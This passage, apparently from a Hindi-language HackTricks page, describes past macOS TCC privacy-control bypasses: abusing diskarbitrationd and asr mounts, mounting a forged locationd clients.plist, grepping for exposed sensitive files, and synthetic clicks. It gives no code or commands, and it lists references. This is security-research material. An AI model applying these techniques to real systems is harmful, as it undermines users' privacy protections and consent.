इसने एक हमलावर को किसी भी स्थान पर मनमाने माउंट करने की अनुमति दी, जिसमें TCC डेटाबेस पर `diskarbitrationd` के अधिकार `com.apple.private.security.storage-exempt.heritable` के कारण शामिल है।

### asr

उपकरण **`/usr/sbin/asr`** ने पूरे डिस्क को कॉपी करने और TCC सुरक्षा को बायपास करते हुए इसे किसी अन्य स्थान पर माउंट करने की अनुमति दी।

### स्थान सेवाएँ

**`/var/db/locationd/clients.plist`** में एक तीसरा TCC डेटाबेस है जो उन क्लाइंट्स को इंगित करता है जिन्हें **स्थान सेवाओं** तक **पहुँचने** की अनुमति है।\
फोल्डर **`/var/db/locationd/` DMG माउंटिंग से सुरक्षित नहीं था** इसलिए यह हमारे अपने plist को माउंट करना संभव था।

## स्टार्टअप ऐप्स द्वारा

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep द्वारा

कई अवसरों पर फ़ाइलें संवेदनशील जानकारी जैसे ईमेल, फोन नंबर, संदेश... गैर-सुरक्षित स्थानों में संग्रहीत करेंगी (जो Apple में एक कमजोरियों के रूप में गिनती है)।

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## सिंथेटिक क्लिक

यह अब काम नहीं करता, लेकिन [**पहले काम करता था**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

एक और तरीका [**CoreGraphics इवेंट्स**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) का उपयोग करना:

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## संदर्भ

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
